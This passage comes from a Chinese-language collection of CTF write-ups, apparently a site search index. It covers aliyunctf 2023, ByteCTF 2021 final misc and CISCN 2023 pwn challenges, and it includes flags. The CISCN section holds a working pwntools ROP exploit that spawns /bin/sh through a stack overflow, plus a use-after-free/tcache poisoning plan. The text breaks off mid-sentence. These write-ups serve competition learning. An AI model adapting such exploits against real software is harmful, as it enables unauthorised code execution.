\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\uff0c\u7528\u6237\u540d\u548c\u5bc6\u7801\u90fd\u6709\uff0c\u4e3b\u673a\u548c\u7aef\u53e3\u4e5f\u6709\u3002\u8fd9\u4e2a MQTT \u8fde\u63a5 subscribe \u4e86 /.../.../user/get\uff0cpublish \u5230 /.../.../user/update\u3002\u53d1\u9001\u4e86\u4e00\u4e2a <code>{\"id\":\"1\"}</code>\uff0c\u7136\u540e\u5f97\u5230\u4e86 <code>Try entering what you want</code>\u3002</p> <p>\u6240\u4ee5\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u53d1\u9001\u5176\u4ed6\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 python \u7684 sdk \u6765\u8fdb\u884c\u8fde\u63a5\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5 patch \u8fd9\u4e2a\u7a0b\u5e8f\u3002\u4f46\u662f IDA \u91cc\u9762 patch \u4f1a\u6709\u95ee\u9898\uff0c\u4e0d\u5982\u76f4\u63a5\u4fee\u6539\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u9700\u8981\u4fee\u6539\u7684\u5185\u5bb9\u662f <code>{\"id\":\"1\"}</code> \u4ee5\u53ca\u53d1\u9001\u7684\u957f\u5ea6\uff0c\u4fee\u6539\u6210 <code>{\"id\":\"flag\"}</code> \u4e4b\u540e\u8fd0\u884c\u5c31\u53ef\u4ee5\u5f97\u5230\uff1a</p> <pre><code>...\n[1682249712.939][LK-0309] sub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\n[1682249712.939][LK-0309] pub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/update\n\n[LK-030A] &gt; 7B 22 69 64 22 3A 22 66  6C 61 67 22 7D          | {\"id\":\"flag\"}   \n\nsuback, res: -0x0000, packet id: 1, max qos: 1\nheartbeat response\n[1682249712.999][LK-0309] pub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\n\n[LK-030A] &lt; 61 6C 69 79 75 6E 63 74  66 7B 35 35 35 38 62 65 | aliyunctf{5558be\n[LK-030A] &lt; 32 65 32 38 36 66 65 62  65 39 62 61 35 34 63 37 | 2e286febe9ba54c7\n[LK-030A] &lt; 32 31 63 62 34 61 30 65  36 31 7D                | 21cb4a0e61}     \n\npub, qos: 0, topic: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\npub, payload: aliyunctf{5558be2e286febe9ba54c721cb4a0e61}\n</code></pre> <p>\u6240\u4ee5 flag: aliyunctf{5558be2e286febe9ba54c721cb4a0e61}\u3002</p> <p>\u6700\u540e\u603b\u7ed3\u4e00\u4e0b\uff0c\u8fd9\u9898\u6298\u78e8\u4e86\u65f6\u95f4\u6700\u4e45\uff0c\u6211\u89c9\u5f97\u6f0f\u6d1e\u4e5f\u4e0d\u5c0f\uff0c\u53eb\u5783\u573e\u9898\u597d\u50cf\u4e5f\u4e0d\u81f3\u4e8e\uff0c\u4f46\u786e\u5b9e\u50bb\u903c\uff08x\u3002\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u70b9\u6211\u8fd8\u4e0d\u660e\u767d\uff1a</p> <ul> <li>\u97f3\u9891\u91cc\u6bcf\u6761\u4e3a\u4ec0\u4e48\u8981\u91cd\u590d\u4e09\u6b21\uff0c\u4e3a\u4ec0\u4e48\u5f00\u5934\u4f1a\u6709\u4e00\u5806 ****\uff0c\u4e3a\u4ec0\u4e48\u540e\u4e09\u6761\u5185\u5bb9\u662f 0x8d8d8d8d \u7684\u4e00\u70b9\u7528\u90fd\u6ca1\u6709<ul> <li>\u6211\u89c9\u5f97\u53ef\u80fd\u662f\u67d0\u79cd\u901a\u8baf\u7684\u534f\u8bae\u4e4b\u7c7b\u7684\uff0c\u4f46\u662f\u6ca1\u6709\u627e\u5230</li> </ul> </li> <li>\u8fd9\u4e2a 01 \u4e32\u7684\u5904\u7406\u786e\u5b9e\u6709\u70b9\u8981\u8111\u6d1e\u7684\uff0c\u4e0d\u592a\u597d\uff0c\u5361\u4e86\u5f88\u957f\u65f6\u95f4\uff08\u4f46\u662f\u5982\u679c\u662f\u901a\u8baf\u534f\u8bae\u7684\u8981\u6c42\u90a3\u6211\u65e0\u8bdd\u53ef\u8bf4\uff09</li> <li>\u89e3\u51fa\u6765\u7684 ALBB-iot2023.oss.... \u7684\u5199\u6cd5\u771f\u7684\u5f88\u5bb9\u6613\u6df7\u6dc6\u7684\uff0c\u800c\u4e14\u5f97\u5230\u5047 flag \u4e4b\u540e\u5c31\u4f1a\u89c9\u5f97\u5df2\u7ecf\u6ca1\u6709\u53ef\u7528\u4fe1\u606f\u4e86<ul> <li>\u867d\u7136 bucket \u540d\u4e0d\u80fd\u5927\u5199\u8fd9\u4e2a\u95ee\u9898\u786e\u5b9e\u540e\u6765\u624d\u53d1\u73b0</li> </ul> </li> <li>MQTT \u534f\u8bae\u7684\u51fa\u73b0\u6709\u70b9\u7a81\u5140\uff0c\u50cf\u662f\u786c\u5957\u5a03+\u5ba3\u4f20\u963f\u91cc\u4e91\u4ea7\u54c1\uff0c\u800c\u4e14\u5df2\u6709\u5e93\u597d\u50cf\u90fd\u4e0d\u592a\u597d\u7528\uff0c\u8fd8\u662f\u76f4\u63a5 patch \u53ef\u6267\u884c\u6587\u4ef6\u65b9\u4fbf\uff0c\u4ee5\u53ca\u5230\u5e95\u8981 pub \u4ec0\u4e48\u4e5f\u8981\u731c\uff0c\u4e0d\u597d</li> </ul>"},{"location":"writeups/aliyunctf2023/#happytree","title":"HappyTree","text":"<p>\u5176\u5b9e\u5c31\u662f\u4e00\u9053 ETH \u9898\uff0c\u5bc6\u7801\u5b66\u6210\u5206\u4e0d\u591a\u3002\u56db\u8001\u5e08\u505a\u7684\uff0c\u770b\u4e86\u4e00\u4e0b\u8fd8\u633a\u597d\u73a9\u7684\u3002</p> \u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Greeter {\n    uint256 public x;\n    uint256 public y;\n    bytes32 public root;\n    mapping(bytes32 =&gt; bool) public used_leafs;\n\n    constructor(bytes32 root_hash) {\n        root = root_hash;\n    }\n\n    modifier onlyGreeter() {\n        require(msg.sender == address(this));\n        _;\n    }\n\n    function g(bool a) internal returns (uint256, uint256) {\n        if (a) return (0, 1);\n        assembly {\n            return(0, 0)\n        }\n    }\n\n    function a(uint256 i, uint256 n) public onlyGreeter {\n        x = n;\n        g((n &lt;= 2));\n        x = i;\n    }\n\n    function b(\n        bytes32[] calldata leafs,\n        bytes32[][] calldata proofs,\n        uint256[] calldata indexs\n    ) public {\n        require(leafs.length == proofs.length, \"Greeter: length not equal\");\n        require(leafs.length == indexs.length, \"Greeter: length not equal\");\n\n        for (uint256 i = 0; i &lt; leafs.length; i++) {\n            require(\n                verify(proofs[i], leafs[i], indexs[i]),\n                \"Greeter: proof invalid\"\n            );\n            require(used_leafs[leafs[i]] == false, \"Greeter: leaf has be used\");\n            used_leafs[leafs[i]] = true;\n            this.a(i, y);\n            y++;\n        }\n    }\n\n    function verify(\n        bytes32[] memory proof,\n        bytes32 leaf,\n        uint256 index\n    ) internal view returns (bool) {\n        bytes32 hash = leaf;\n\n        for (uint256 i = 0; i &lt; proof.length; i++) {\n            bytes32 proofElement = proof[i];\n\n            if (index % 2 == 0) {\n                hash = keccak256(abi.encodePacked(hash, proofElement));\n            } else {\n                hash = keccak256(abi.encodePacked(proofElement, hash));\n            }\n\n            index = index / 2;\n        }\n\n        return hash == root;\n    }\n\n    function isSolved() public view returns (bool) {\n        return x == 2 &amp;&amp; y == 4;\n    }\n}\n</code></pre> <p>\u4ee5\u53ca\u7ed9\u4e86\u4e00\u4e9b\u5df2\u6709\u7684\u4fe1\u606f\uff1a</p> <pre><code>alice: 0x81376b9868b292a46a1c486d344e427a3088657fda629b5f4a647822d329cd6a\nBob:   0x28cac318a86c8a0a6a9156c2dba2c8c2363677ba0514ef616592d81557e679b6\nCalor: 0x804cd8981ad63027eb1d4a7e3ac449d0685f3660d6d8b1288eb12d345ca2331d\nroot:  0xb57c9b430ecc5b184f7ab285b8c9ca898e3e528c4668d136ee0fab03ae716f86\n</code></pre> <p>\u8981\u505a\u7684\u5c31\u662f\u8c03\u7528 b \u51fd\u6570\uff0c\u901a\u8fc7\u9a8c\u8bc1\uff0c\u8fd9\u65f6\u4f1a\u4fee\u6539 x \u548c y \u7684\u503c\uff0c\u6700\u7ec8\u8981\u4f7f\u5f97 x == 2 \u4e14 y == 4\u3002</p> <p>y == 4 \u7684\u8bdd\u4ece\u4ee3\u7801\u770b\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\u5c31\u662f\u8981\u5728 b \u51fd\u6570\u91cc\u9762\u5faa\u73af\u9a8c\u8bc1\u56db\u7ec4\uff0c\u4f46\u8fd9\u6837\u7684\u8bdd x \u7684\u9884\u671f\u5c31\u5e94\u8be5\u662f 3\uff08\u56e0\u4e3a\u51fd\u6570 g \u91cc\u9762 assembly \u7684 return \u662f EVM \u7684 return \u5b57\u8282\u7801\uff0c\u6548\u679c\u662f\u76f4\u63a5\u8fd4\u56de\u6574\u4e2a\u8c03\u7528\uff0c\u800c\u4e0d\u662f\u8fd4\u56de\u5f53\u524d\u51fd\u6570\u8c03\u7528\uff09\u3002</p> <p>\u4f46\u662f\u8fd9\u4e2a\u5199\u6cd5\u5f88\u5947\u602a\uff0c\u641c\u7d22\u53ef\u4ee5\u641c\u5230 https://blog.soliditylang.org/2022/09/08/storage-write-removal-before-conditional-termination/\uff0c\u662f\u4e00\u4e2a bug\uff0c\u5728 0.8.17 \u7248\u672c\u4e4b\u524d\u7f16\u8bd1\u51fa\u6765\u7684\u7ed3\u679c\u4f1a\u5bfc\u81f4\u5982\u679c g \u91cc\u9762\u76f4\u63a5\u7ed3\u675f\u4ea4\u6613\u4e86\uff0c\u5176\u5b9e\u8fd9\u4e4b\u524d a \u51fd\u6570\u91cc\u9762\u4e4b\u524d\u7684 x \u7684\u4fee\u6539\u5e76\u4e0d\u4f1a\u53d1\u751f\uff0c\u5bfc\u81f4 x \u7684\u503c\u8fd8\u662f\u4e0a\u6b21\u5f97\u5230\u7684 2\u3002</p> <p>\u6240\u4ee5\u5176\u5b9e\u53ea\u8981\u63d0\u4f9b\u56db\u7ec4\u53ef\u4ee5\u9a8c\u8bc1\u7684 leafs proofs index \u5c31\u53ef\u4ee5\u4e86\u3002\u53ef\u4ee5\u5f97\u5230\uff1a</p> <pre><code>a = keccak256(abi.encodePacked(alice, bob)) = 0x9b1a0a45cfdc60f45820808958c1895d44da61c8f804f5560020a373b23ad51e\nb = keccak256(abi.encodePacked(calor, calor)) = 0x4a35f5bda2916fbfac6936f63313cee16979995b2409de59ceda0377bae8c486\n\u540c\u65f6\nkeccak256(abi.encodePacked(a, b)) == root\n</code></pre> <p>\u6240\u4ee5\u90a3\u4e48\u73b0\u5728\u5c31\u6709\u4e86\uff1a</p> <pre><code>root == root\nhash(a, b) == root\nhash(b, a) == root\nhash(hash(alice, bob), b) == hash(a, b) == root\n</code></pre> <p>\u8fd9\u56db\u7ec4\u5c31\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u4e86\u3002flag: aliyunctf{scuy6bart2dwep6smad2step6cust}</p>"},{"location":"writeups/aliyunctf2023/#_2","title":"\u61c2\u5f97\u90fd\u61c2\u5e26\u5e26\u5f1f\u5f1f","text":"<p>\u6ca1\u6b63\u7ecf\u505a\u51fa\u6765\uff0c\u4e5f\u4e0d\u4f1a v8\uff0c\u4f46\u662f\u8fd9\u4e2a\u9898\u7684\u975e\u9884\u671f\u633a 6 \u7684\u6240\u4ee5\u8bb0\u5f55\u4e00\u4e0b\u3002</p> <p>\u4e00\u4e2a js v8 \u7684\u9898\uff0c\u5728\u6700\u65b0\u7248\u4e0a patch \u5220\u9664\u6389\u4e86 write\u3001read\u3001readbuffer\u3001readline\u3001load\u3001os \u7b49\u529f\u80fd\uff0c\u5e76\u4e14 revert \u4e86 commit 30e4ba6df4cdf5582de4d79850bcd270e6a75a7a\uff0c\u52a0\u56de\u6765\u4e86\u4e00\u4e9b\u4e4b\u524d\u5220\u6389\u7684\u5e8f\u5217\u5316\u7684\u529f\u80fd\u3002\u8981\u6c42\u662f\u4e0e\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684 d8 \u89e3\u91ca\u5668\u4ea4\u4e92\uff0c\u8bfb\u53d6\u5230\u670d\u52a1\u5668\u4e0a\u7684 flag\u3002</p> <p>\u8fd9\u9898\u7684\u975e\u9884\u671f\u5c31\u662f\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 import() \u7136\u540e\u5bfc\u81f4\u52a0\u8f7d\u8fdb\u6765\u7684 flag \u5185\u5bb9\u8bed\u6cd5\u9519\u8bef\uff0c\u5728\u62a5\u9519\u4fe1\u606f\u4e2d\u76f4\u63a5\u6253\u51fa flag\uff1a</p> <pre><code>V8 version 11.4.117\nd8&gt; import(\"../flag\")\n/flag:1: SyntaxError: Unexpected token '{'\naliyunctf{woot_woot_thanks_for_closing_the_issue_hey_it_regressed_rEEOpENPLZhttps__github_com_nodejs_node_issues_18265_6144641bbe2c577a}\n         ^\nSyntaxError: Unexpected token '{'\n\n/flag:1: SyntaxError: Unexpected token '{'\naliyunctf{woot_woot_thanks_for_closing_the_issue_hey_it_regressed_rEEOpENPLZhttps__github_com_nodejs_node_issues_18265_6144641bbe2c577a}\n         ^\nSyntaxError: Unexpected token '{'\n\n[object Promise]\nd8&gt;\n</code></pre> <p>\u540c\u65f6\u4e5f\u53ef\u4ee5\u770b\u5230\u9884\u671f\u505a\u6cd5\u5176\u5b9e\u662f\u53c2\u8003 https://github.com/nodejs/node/issues/18265\u3002</p>"},{"location":"writeups/bytectf2021_final/","title":"ByteCTF 2021 Final Writeup","text":"<p> \u7ea6 496 \u4e2a\u5b57  58 \u884c\u4ee3\u7801  14 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u573a\u6bd4\u8d5b misc AK \u4e86\uff0c\u8fd8\u633a\u723d\u7684</p>"},{"location":"writeups/bytectf2021_final/#enrich-life","title":"Enrich Life","text":"<p>\u9996\u5148\u4f7f\u7528 ffprobe \u53d1\u73b0 description \u91cc\u7684 hint\uff1a<code>FlagInChromaFrames</code>\uff0c\u4ee5\u53ca\u989c\u8272\u683c\u5f0f\u4e3a yuv240p\uff0c\u6240\u4ee5\u601d\u8def\u5c31\u662f\u770b\u4e00\u770b yuv \u4e2d\u4ee3\u8868\u8272\u5ea6 chroma \u7684 uv \u5206\u91cf</p> <p>\u901a\u8fc7\u548c\u6296\u97f3\u4e0a\u7684\u6e90\u89c6\u9891\u5bf9\u6bd4\u53d1\u73b0\u9898\u76ee\u89c6\u9891\u7684\u524d\u534a\u6bb5\u6709\u6bd4\u8f83\u660e\u663e\u7684\u6d45\u7ea2\u8272\uff08v\uff09\u95ea\u70c1\uff0c\u5e76\u4e14\u7ecf\u8fc7 YuvEye \u6253\u5f00\u89c2\u5bdf\uff0c\u53d1\u73b0 v \u901a\u9053\u5404\u4e2a\u5e27\u4e4b\u95f4\u6709\u660e\u663e\u7684\u660e\u6697\u53d8\u5316\uff0c\u6301\u7eed\u5230 1160 \u5e27\u5de6\u53f3\u6062\u590d\u6b63\u5e38</p> <p>\u5408\u7406\u731c\u6d4b v \u5206\u91cf\u4e2d\u5229\u7528\u76f8\u5bf9\u7684\u660e/\u6697\u4ee3\u886801\u4ee5\u67d0\u79cd\u65b9\u5f0f\u85cf\u4e86\u4fe1\u606f</p> <p>\u6839\u636e hint\uff1aPlot the data you found over time and find the pattern\uff0c\u628a\u6bcf\u4e00\u5e27\u7684 v \u5206\u91cf\u7684\u5e73\u5747\u503c\u968f\u65f6\u95f4\u7684\u53d8\u5316\u753b\u51fa\u6563\u70b9\u56fe\uff1a</p> <pre><code>import cv2\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nvideo = cv2.VideoCapture('enrich_life.mp4')\n\nn = 300\nx = [i for i in range(n*8)]\ny = []\nfor i in range(n*8):\n    _, frame = video.read()\n    frame = frame[:, :, :]\n    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2YUV)\n    Y, U, V = cv2.split(frame)\n    y.append(np.abs(np.average(V)))\n\nplt.figure(figsize=(64,16))\nplt.scatter(x, y, s=1)\nplt.show()\n\nprint(y)\n</code></pre> <p></p> <p>\u53d1\u73b0\u524d\u671f\u7684 v \u5206\u91cf\u5448\u73b0\u51fa 5 \u4e2a\u4e00\u7ec4\u7684\u4e0a\u5347/\u4e0b\u964d\uff0c\u6240\u4ee5\u628a\u4e0a\u5347\u7684\u4e00\u7ec4\u8bb0\u4e3a 1\uff0c\u4e0b\u964d\u7684\u4e00\u7ec4\u8bb0\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230 flag\uff1a</p> <pre><code>import cv2\nimport numpy as np\nfrom Crypto.Util.number import *\nvideo = cv2.VideoCapture('enrich_life.mp4')\ny = np.reshape([np.abs(np.average(cv2.split(cv2.cvtColor(video.read()[1][:,:,:], cv2.COLOR_BGR2YUV))[2])) for _ in range(150*8)], (240,5))\nprint(long_to_bytes(int(\"\".join(['1' if y[i, 0] &lt; y[i, 1] else '0' for i in range(240)]), 2)))\n# b'ByteCTF{bYTEctf-SecurityYYDS}\\x8a'\n</code></pre>"},{"location":"writeups/bytectf2021_final/#fps_game","title":"FPS_game","text":"<p>\u5730\u9762\u9ad8\u5ea6 1072851582\uff0c\u7528 Cheat Engine \u6539\u6210 1078000000 \u9501\u5b9a</p> <p></p> <p>\u53e6\u89e3\uff1a\u628a dll\uff08\u7528 il2cppdumper \u8f85\u52a9\u5206\u6790\uff09\u4e2d\u89d2\u8272\u662f\u5426\u5728\u5730\u9762\u7684\u5224\u5b9a\u6539\u4e3a\u6052\u4e3a\u771f\uff0c\u8fd9\u6837\u5728\u7a7a\u4e2d\u4e5f\u80fd\u7ee7\u7eed\u5411\u4e0a\u8df3\u3002</p> <p></p>"},{"location":"writeups/bytectf2021_final/#lisas-cat","title":"Lisa's cat","text":"<p>\u7528 RGB2YUV \u8f6c\u6362\u56fe\u7247</p> <p>\u5728 green 0 \u4e2d\u770b\u5230\u4e0b\u56fe</p> <p></p> <p>\u7136\u540e\u83b7\u53d6 red 0 \u548c blue 0</p> <p></p> <p></p> <p>\u611f\u89c9\u5f88\u50cf\uff0c\u5f02\u6216\u4e00\u4e0b\u5f97\u5230\u4e0b\u56fe</p> <p></p> <p>\u6839\u636e hint\uff0c\u731c\u6d4b\u662f\u4f7f\u7528 Arnold's Cat Map \u8fdb\u884c\u53d8\u6362\uff0c\u518d\u6839\u636e green 0 \u4e2d\u7684\u6570\u5b57\u53d6 Cat Map \u53c2\u6570</p> <pre><code>import os\n\nfrom PIL.Image import open as load_pic, new as new_pic\n\ndef main(path, iterations, name=\"arnold_cat-{name}-{index}.png\"):\n    title = os.path.splitext(os.path.split(path)[1])[0]\n    ppath=path\n    counter = 0\n    while counter &lt; iterations:\n        with load_pic(path) as image:\n            dim = width, height = image.size\n            with new_pic(image.mode, dim) as canvas:\n                for x in range(width):\n                    for y in range(height):\n                        nx = (1 * x + 20 * y) % width\n                        ny = (21 * x + 421 * y) % height\n                        canvas.putpixel((nx, height-ny-1), image.getpixel((x, height-y-1)))\n        counter += 1\n        print(counter, end=\"\\r\")\n        path = name.format(name=title, index=counter)\n        canvas.save(path)\n\n    return canvas\n\nresult = main(\"233.bmp\", 384)\nresult.show()\n</code></pre> <p>\u7b2c\u4e00\u5f20\u56fe\u5c31\u662f</p> <p></p>"},{"location":"writeups/bytectf2021_final/#undercover","title":"Undercover","text":"<p>\u62ff\u5230\u9898\u76ee\u53d1\u73b0\u7ed9\u9898\u7684\u65b9\u5f0f\u4e0d\u662f\u53d1\u9644\u4ef6\u800c\u662f\u76f4\u63a5\u63d2\u5165\u56fe\u7247\uff0c\u6240\u4ee5\u8003\u8651\u662f\u4e0d\u662f\u548c\u94fe\u63a5\u6709\u5173\u7cfb\uff1a</p> <pre><code>https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-imagexlite-0bb543cf5d800a1a226c9d1fe716be95.png\n</code></pre> <p>\u53d1\u73b0\u4e86 <code>~tplv-</code> \uff0c\u6240\u4ee5\u4e0a\u56fe\u5e94\u8be5\u662f\u4f7f\u7528 velmageX \u7528\u5904\u7406\u6a21\u677f\u5904\u7406\u8fc7\u7684\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u5220\u6389\u5904\u7406\uff0c\u5f97\u5230\u539f\u59cb\u56fe\u7247\u7684\u5730\u5740\uff1a</p> <pre><code>https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-image.png\n\u6216\nhttps://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~noop.png\n</code></pre> <p>\u518d\u6839\u636e hint\uff1aOriginal image have exif\uff0c\u67e5\u770b\u8fd9\u4e2a\u56fe\u7247\u7684 exif\uff0c\u53d1\u73b0\u6709 Author \u4e00\u9879\uff1a<code>Author: From: Zach Oakes</code></p> <p>\u641c\u7d22 Zach Oakes \u53d1\u73b0\u4ed6\u5199\u7684\u4e00\u4e2a\u9690\u5199\u5de5\u5177\uff1ahttps://sekao.net/pixeljihad/</p> <p>\u628a\u8fd9\u5f20\u56fe\u7247\u4f20\u5165\u62ff\u5230 flag\uff1a</p> <p></p>"},{"location":"writeups/ciscn2023/","title":"CISCN 2023 Quals Writeup","text":"<p> \u7ea6 1032 \u4e2a\u5b57  235 \u884c\u4ee3\u7801  5 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u7b2c\u4e00\u6b21\u6253\u56fd\u8d5b\uff0cmisc \u592a\u70c2\u4e86\uff0c\u4e8e\u662f\u505a\u4e86\u4e24\u5929 pwn\uff0c\u8fd8\u633a\u597d\u73a9\u7684\u3002</p>"},{"location":"writeups/ciscn2023/#_1","title":"\u70e7\u70e4\u644a\u513f","text":"<p>\u9759\u6001\u94fe\u63a5\uff0c\u6ca1\u6709 PIE\u3002</p> <p>main \u51fd\u6570\u4e2d\u8c03\u7528 menu\uff0c\u8fd4\u56de\u7528\u6237\u9009\u9879\uff0c\u7136\u540e\u901a\u8fc7\u51fd\u6570\u5730\u5740\u504f\u79fb\u5f97\u5230\u6267\u884c\u7684\u51fd\u6570 pijiu\u3001chuan\u3001yue\u3001vip\u3001gaiming \u7b49\u3002</p> <p>gaiming \u4e2d scanf \u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u800c\u6539\u540d\u9700\u8981\u4e70\u4e0b\u644a\u5b50\uff0c\u82b1\u8d39 100000\u3002</p> <p>\u9006\u5411 pijiu \u53d1\u73b0\u8f93\u5165\u7684\u8d2d\u4e70\u74f6\u6570\u662f signed int\uff0c\u6240\u4ee5\u53ea\u8981\u8fd9\u91cc\u8f93\u5165\u8d1f\u6570\u5c31\u53ef\u4ee5\u589e\u52a0\u94b1\u3002</p> <p>\u4e70\u4e0b\u644a\u5b50\u540e\u901a\u8fc7 gaiming \u4e2d\u7684\u6808\u6ea2\u51fa\u8fdb\u884c ROP \u5373\u53ef\uff0c\u76f4\u63a5\u8c03\u7528 syscall \u6267\u884c /bin/sh\uff0c/bin/sh \u53ef\u4ee5\u901a\u8fc7 gaiming \u4e2d\u7684 strcpy \u62f7\u8d1d\u5230 name \u4e2d\u3002</p> exp <pre><code>p.sendlineafter(b\"&gt; \", b\"1\")\n[p.recvline() for i in range(3)]\np.sendline(b\"1\")\np.sendlineafter(b\"\\n\", b\"-1000000\")\np.sendlineafter(b\"&gt; \", b\"4\")\n\n# gaiming stack\n\"\"\"\ngaiming stack:\n00:0000\u2502 rsp\n01:0008\u2502 \n02:0010\u2502 \n03:0018\u2502 \n04:0020\u2502 rbp\n05:0028\u2502 ret addr\n\"\"\"\n\n\"\"\"\n0x0000000000402404 : syscall\n0x000000000040264f : pop rdi ; ret\n0x0000000000458827 : pop rax ; ret\n0x000000000040a67e : pop rsi ; ret\n0x00000000004a404a : pop rax ; pop rdx ; pop rbx ; ret\n\"\"\"\n\n# syscall(rdi: &amp;\"/bin/sh\", rax: 59, rsi: 0, rdx: 0)\npayload = b\"/bin/sh\\x00\"\npayload += b\"AAAAAAAA\"\npayload += b\"AAAAAAAA\"\npayload += b\"AAAAAAAA\"\npayload += b\"AAAAAAAA\" # fill stack\npayload += p64(0x40264f) # pop rdi ; ret\npayload += p64(0x4e60f0) # name\npayload += p64(0x4a404a) # pop rax ; pop rdx ; pop rbx ; ret\npayload += p64(59)\npayload += p64(0)\npayload += p64(0)\npayload += p64(0x40a67e) # pop rsi ; ret\npayload += p64(0)\npayload += p64(0x402404) # syscall\n\np.sendlineafter(b\"&gt; \", b\"5\")\np.sendlineafter(b\"\\n\", payload)\n\np.interactive()\n</code></pre>"},{"location":"writeups/ciscn2023/#strangetalkbot","title":"StrangeTalkBot","text":"<p>\u9006\u5411\u7a0b\u5e8f\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e9b BINARYBF-c.c \u4e4b\u7c7b\u7684\uff0c\u914d\u5408 assert \u641c\u7d22\u53ef\u4ee5\u77e5\u9053\u662f\u4f7f\u7528\u4e86 protobuf\uff0cmain \u51fd\u6570\u4e2d\u8c03\u7528\u7684 sub_192D \u51fd\u6570\u5c31\u662f\u8fdb\u884c protobuf \u6d88\u606f\u7684\u89e3\u6790\uff0c\u7136\u540e\u5c06\u5f97\u5230\u7684 v4[4:9] \u4f20\u5165\u4e86 sub_155D \u8fdb\u884c\u5206\u7c7b\u5904\u7406\uff0c\u8fd9\u90e8\u5206\u53c2\u6570\u5c31\u662f\u7528\u6237\u8f93\u5165\u7684 protobuf message \u7ed3\u6784\u3002</p> <p>\u901a\u8fc7 sub_155D \u53ef\u4ee5\u77e5\u9053\u4e00\u5171\u6709\u56db\u79cd\u64cd\u4f5c\uff0c\u5bf9\u4e00\u7cfb\u5217\u5806\u8fdb\u884c\u64cd\u4f5c\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570 int64 \u5c31\u662f\u9009\u62e9\u64cd\u4f5c\u3002\u6808\u4e0a\u4fdd\u5b58\u4e00\u4e2a base_addr \u8bb0\u5f55\u591a\u4e2a malloc \u5206\u914d\u7684\u5730\u5740\uff0c\u4f20\u5165\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5806\u7684\u7d22\u5f15\u3002\u7b2c\u4e09\u548c\u7b2c\u56db\u4e2a\u53c2\u6570\u548c\u8d77\u6765\u662f\u4e00\u4e2a bytes \u5e8f\u5217\uff08\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u8fd9\u4e2a\u5e8f\u5217\u7684\u957f\u5ea6\uff09\u6240\u4ee5\u4ea4\u4e92\u9700\u8981\u7684 protobuf \u7ed3\u6784\uff1a</p> <pre><code>syntax = \"proto3\";\n\nmessage Msg {\n    int64 id = 1;\n    int64 idx = 2;\n    int64 size = 3;\n    bytes buf = 4;\n}\n</code></pre> <p>\u4e00\u4e9b\u9650\u5236\uff1a\u53ea\u80fd\u521b\u5efa 0x20 \u4e2a\u5806\uff0c\u5806\u7684\u5927\u5c0f/bytes \u5e8f\u5217\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7 0xf0\u3002</p> <p>\u56db\u4e2a\u64cd\u4f5c\uff1a</p> <ul> <li>1 - create\uff1a\u5982\u679c base+i \u5904\u6ca1\u6709\u8bb0\u5f55\u5206\u914d\u7684\u5730\u5740\uff0c\u5219\u65b0 malloc \u4e00\u4e2a\uff0c\u5927\u5c0f\u4e3a size \u548c buf \u957f\u5ea6\u7684\u6700\u5927\u503c\uff0c\u7136\u540e\u5c06 buf \u4e2d\u5185\u5bb9\u62f7\u8d1d\u8fc7\u53bb</li> <li>2 - update\uff1a\u66f4\u65b0 base+i \u6307\u5411\u7684\u5806\u7684\u5185\u5bb9\uff0c\u62f7\u8d1d buf \u5185\u5bb9\u8fc7\u53bb\uff08\u957f\u5ea6\u8d85\u8fc7\u539f\u5927\u5c0f\u4f1a\u622a\u65ad\uff09</li> <li>3 - print\uff1a\u5c06 base+i \u6307\u5411\u7684\u5806\u7684\u5185\u5bb9\u5168\u90e8\u8f93\u51fa\u5230 stdout</li> <li>4 - delete\uff1afree \u6389 base+i \u6307\u5411\u7684\u5806\uff0c\u4f46\u4e0d\u6e05\u7a7a base+i \u5904\u8bb0\u5f55\u7684\u6307\u9488</li> </ul> <p>\u7531\u4e8e free \u7684\u65f6\u5019\u6307\u9488\u4ecd\u7559\u7740\uff0c\u6240\u4ee5\u5b58\u5728 UAF\u3002\u601d\u8def\uff1a</p> <ul> <li>\u5148\u901a\u8fc7\u989d\u5916\u4e03\u4e2a\u5806\u7ed5\u8fc7 tcache\uff0c\u63a5\u7740 free \u4e00\u4e2a\u5806\u5230 unordered bin\uff0c\u4ece\u800c\u901a\u8fc7 fd bk leak \u5f97\u5230 libc \u57fa\u5740</li> <li>\u7136\u540e\u5229\u7528 UAF \u4fee\u6539 tcache bin \u4e2d\u7684 fd \u4f7f\u5f97\u91cd\u65b0 malloc \u56de\u6765\u7684\u5730\u5740\u53d8\u4e3a __free_hook</li> <li>\u6700\u540e\u5728 __free_hook 